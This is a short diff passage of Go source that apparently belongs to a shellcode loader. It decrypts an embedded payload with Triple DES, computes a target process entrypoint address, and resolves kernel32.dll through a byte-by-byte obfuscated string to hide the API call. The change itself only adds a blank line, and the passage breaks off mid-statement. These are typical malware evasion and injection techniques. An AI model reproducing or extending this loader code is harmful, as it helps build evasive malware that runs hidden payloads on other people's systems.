@@ -177,6 +177,7 @@ func main() {
 	entrypointAddress := imageBaseValue + uint64(entrypointRVA)
 	zzzh()
 	decryptedsch := decryptDES3(sch, key, iv)
+
 	syscall.MustLoadDLL(string([]byte{
 		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
 	})).MustFindProc(string([]byte{
